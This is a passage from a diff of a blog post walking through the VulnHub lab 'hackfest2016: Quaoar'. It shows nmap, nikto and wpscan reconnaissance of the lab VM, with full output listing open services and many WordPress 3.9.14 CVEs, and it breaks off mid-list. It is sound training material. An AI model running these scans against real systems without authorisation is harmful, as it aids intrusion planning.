@@ -1,12 +1,1046 @@
 ---
 layout: post
-title:  "hackfest2016 : Quaoar"
-date:   2019-04-15 00:34:01 +0000
+title: "hackfest2016 : Quaoar"
+date: 2019-04-15 00:34:01 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:37:10 +0000" name="updated"/><title>hackfest2016 : Quaoar</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/hackfest2016-quaoar,180/" target="_blank">https://www.vulnhub.com/entry/hackfest2016-quaoar,180/</a></div><div>Hostname: quaoar</div><div>IP Address: 10.183.0.219</div><div><br/></div><div>Date started: April 14, 2019 7:36 PM</div><div>Date completed: April 15, 2019 9:59 AM</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.219.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar# nmap -Pn -sT -A -p 1-65535 -oA quaoar 10.183.0.219</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-14 20:44 EDT</div><div>Nmap scan report for Quaoar.homenet.dom (10.183.0.219)</div><div>Host is up (0.0025s latency).</div><div>Not shown: 65526 closed ports</div><div>PORT    STATE SERVICE     VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey: </div><div>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)</div><div>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)</div><div>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp  open  domain      ISC BIND 9.8.1-P1</font></div><div>| dns-nsid: </div><div>|_  bind.version: 9.8.1-P1</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))</font></div><div>| http-robots.txt: 1 disallowed entry </div><div>|_Hackers</div><div>|_http-server-header: Apache/2.2.22 (Ubuntu)</div><div>|_http-title: Site doesn't have a title (text/html).</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">110/tcp open  pop3        Dovecot pop3d</font></div><div>|_pop3-capabilities: PIPELINING TOP SASL CAPA STLS UIDL RESP-CODES</div><div>|_ssl-date: 2019-04-15T00:44:46+00:00; 0s from scanner time.</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">143/tcp open  imap        Dovecot imapd</font></div><div>|_imap-capabilities: more ENABLE IDLE SASL-IR ID LITERAL+ LOGIN-REFERRALS post-login have LOGINDISABLEDA0001 Pre-login OK capabilities IMAP4rev1 STARTTLS listed</div><div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">993/tcp open  ssl/imaps?</font></div><div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">995/tcp open  ssl/pop3s?</font></div><div>|_ssl-date: 2019-04-15T00:44:45+00:00; 0s from scanner time.</div><div>MAC Address: 08:00:27:5A:46:1B (Oracle VirtualBox virtual NIC)</div><div>Device type: general purpose</div><div>Running: Linux 2.6.X|3.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div><div>OS details: Linux 2.6.32 - 3.10</div><div>Network Distance: 1 hop</div><div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div><div><br/></div></div><div>Host script results:</div><div>|_clock-skew: mean: 40m00s, deviation: 1h37m59s, median: 0s</div><div>|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div>| smb-os-discovery: </div><div>|   OS: Unix (Samba 3.6.3)</div><div>|   Computer name: Quaoar</div><div>|   NetBIOS computer name: </div><div>|   Domain name: homenet.dom</div><div>|   FQDN: Quaoar.homenet.dom</div><div>|_  System time: 2019-04-14T20:44:46-04:00</div><div>| smb-security-mode: </div><div>|   account_used: guest</div><div>|   authentication_level: user</div><div>|   challenge_response: supported</div><div>|_  message_signing: disabled (dangerous, but default)</div><div>|_smb2-time: Protocol negotiation failed (SMB2)</div><div><div><br/></div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   2.50 ms Quaoar.homenet.dom (10.183.0.219)</div><div><div><br/></div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 155.90 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>Started by looking at the HTTP service on TCP port 80. The default site just returns some images.</div><div><br/></div><div>Scanned the service with nikto.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar# nikto -h http://10.183.0.219</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.219</div><div>+ Target Hostname:    10.183.0.219</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-14 20:50:19 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> (Ubuntu)</div><div>+ Server may leak inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ Retrieved x-powered-by header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.10-1ubuntu3</font></div><div>+ <b><font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</font></b></div><div>+ "robots.txt" contains 2 entries which should be manually viewed.</div><div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ Uncommon header 'tcn' found, with contents: list</div><div>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html</div><div>+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ 8727 requests: 0 error(s) and 12 item(s) reported on remote host</div><div>+ End Time:           2019-04-14 20:51:01 (GMT-4) (42 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>Nikto reveals some version numbers for Apache and PHP. Nikto also reveals that the robots.txt listed a WordPress site at /wordpress/.</div><div><br/></div><div>Ran wpscan to enumerate issues with the WordPress site.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/hackfest2016/quaoar# wpscan --url http://10.183.0.219/wordpress --wp-content-dir wp-content --enumerate</div><div>_______________________________________________________________</div><div>        __          _______   _____</div><div>        \ \        / /  __ \ / ____|</div><div>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</div><div>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</div><div>           \  /\  /  | |     ____) | (__| (_| | | | |</div><div>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</div><div><div><br/></div><div><br/></div></div><div>        WordPress Security Scanner by the WPScan Team</div><div>                       Version 3.5.1</div><div>          Sponsored by Sucuri - https://sucuri.net</div><div>      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</div><div>_______________________________________________________________</div><div><div><br/></div><div><br/></div></div><div>[i] Updating the Database ...</div><div>[i] Update completed.</div><div><div><br/></div><div><br/></div></div><div>[+] URL: http://10.183.0.219/wordpress/</div><div>[+] Started: Sun Apr 14 21:38:01 2019</div><div><div><br/></div><div><br/></div></div><div>Interesting Finding(s):</div><div><div><br/></div><div><br/></div></div><div>[+] http://10.183.0.219/wordpress/</div><div> | Interesting Entries:</div><div> |  - Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.22</font> (Ubuntu)</div><div> |  - X-Powered-By: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.10-1ubuntu3</font></div><div> | Found By: Headers (Passive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div><div><br/></div></div><div>[+] http://10.183.0.219/wordpress/xmlrpc.php</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div> | References:</div><div> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</div><div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</div><div> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</div><div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</div><div> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</div><div><div><br/></div><div><br/></div></div><div>[+] http://10.183.0.219/wordpress/readme.html</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div><div><br/></div></div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] Upload directory has listing enabled: http://10.183.0.219/wordpress/wp-content/uploads/</font></div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 100%</div><div><div><br/></div><div><br/></div></div><div>[+] http://10.183.0.219/wordpress/wp-cron.php</div><div> | Found By: Direct Access (Aggressive Detection)</div><div> | Confidence: 60%</div><div> | References:</div><div> |  - https://www.iplocation.net/defend-wordpress-from-ddos</div><div> |  - https://github.com/wpscanteam/wpscan/issues/1299</div><div><div><br/></div><div><br/></div></div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).</font></div><div> | Detected By: Rss Generator (Passive Detection)</div><div> |  - http://10.183.0.219/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;</div><div> |  - http://10.183.0.219/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;</div><div> |</div><div> | [!] 38 vulnerabilities identified:</div><div> |</div><div> | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php</div><div> |     Fixed in: 3.9.15</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8716</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488</div><div> |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div><div> |</div><div> | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback</div><div> |     Fixed in: 3.9.15</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8718</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490</div><div> |      - https://www.mehmetince.net/low-severity-wordpress/</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359</div><div> |</div><div> | [!] Title: WordPress &lt;= 4.7 - Post via Email Checks mail.example.com by Default</div><div> |     Fixed in: 3.9.15</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8719</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491</div><div> |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div><div> |</div><div> | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)</div><div> |     Fixed in: 3.9.15</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8720</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492</div><div> |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div><div> |</div><div> | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)</div><div> |     Fixed in: 3.9.15</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8721</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493</div><div> |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection</font></div><div> |     Fixed in: 3.9.16</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8730</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611</div><div> |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb</div><div> |</div><div> | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata</div><div> |     Fixed in: 3.9.17</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8765</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814</div><div> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7</div><div> |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html</div><div> |      - http://seclists.org/oss-sec/2017/q1/563</div><div> |</div><div> | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation</div><div> |     Fixed in: 3.9.17</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8766</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815</div><div> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e</div><div> |</div><div> | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8807</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295</div><div> |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html</div><div> |      - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html</div><div> |      - https://core.trac.wordpress.org/ticket/25239</div><div> |</div><div> | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation</div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8815</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066</div><div> |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |</div><div> | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC</div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8816</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381</div><div> |</div><div> | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks </div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8817</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4</div><div> |</div><div> | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF</div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8818</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67</div><div> |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html</div><div> |</div><div> | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS</div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8819</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6</div><div> |      - https://hackerone.com/reports/203515</div><div> |      - https://hackerone.com/reports/203515</div><div> |</div><div> | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS &amp; CSRF</div><div> |     Fixed in: 3.9.19</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8820</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063</div><div> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/</div><div> |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3</div><div> |</div><div> | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb-&gt;prepare() potential SQL Injection</div><div> |     Fixed in: 3.9.20</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8905</div><div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48</div><div> |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection</font></div><div> |     Fixed in: 4.7.5</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8906</div><div> |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</div><div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48</div><div> |      - https://wpvulndb.com/vulnerabilities/8905</div><div> |</div><div> | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect</div><div> |     Fixed in: 3.9.20</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8910</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725</div><div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div><div> |      - https://core.trac.wordpress.org/changeset/41398</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping</font></div><div> |     Fixed in: 3.9.20</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8911</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719</div><div> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/</div><div> |      - https://core.trac.wordpress.org/changeset/41457</div><div> |</div><div> | [!] Title: WordPress &lt;= 4.8.2 - $wpdb-&gt;prepare() Weakness</div><div> |     Fixed in: 3.9.21</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8941</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510</div><div> |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d</div><div> |      - https://twitter.com/ircmaxell/status/923662170092638208</div><div> |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html</div><div> |</div><div> | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload</div><div> |     Fixed in: 3.9.22</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8966</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092</div><div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509</div><div> |</div><div> | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping</div><div> |     Fixed in: 3.9.22</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8967</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094</div><div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de</div><div> |</div><div> | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing</div><div> |     Fixed in: 3.9.22</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/8969</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091</div><div> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c</div><div> |</div><div> | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)</div><div> |     Fixed in: 3.9.23</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9006</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776</div><div> |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850</div><div> |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/</div><div> |      - https://core.trac.wordpress.org/ticket/42720</div><div> |</div><div> | [!] Title: WordPress &lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched)</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9021</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389</div><div> |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html</div><div> |      - https://github.com/quitten/doser.py</div><div> |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html</div><div> |</div><div> | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default</div><div> |     Fixed in: 3.9.24</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9053</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101</div><div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216</div><div> |</div><div> | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login</div><div> |     Fixed in: 3.9.24</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9054</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100</div><div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e</div><div> |</div><div> | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag</div><div> |     Fixed in: 3.9.24</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9055</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102</div><div> |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/</div><div> |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d</div><div> |</div><div> | [!] Title: WordPress &lt;= 4.9.6 - Authenticated Arbitrary File Deletion</div><div> |     Fixed in: 3.9.25</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9100</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895</div><div> |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</div><div> |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/</div><div> |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd</div><div> |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/</div><div> |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9169</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9170</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/</div><div> |</div><div><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data</font></div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9171</div><div> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148</div><div> |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/</div><div> |</div><div> | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)</div><div> |     Fixed in: 3.9.26</div><div> |     References:</div><div> |      - https://wpvulndb.com/vulnerabilities/9172</div><div> |      - 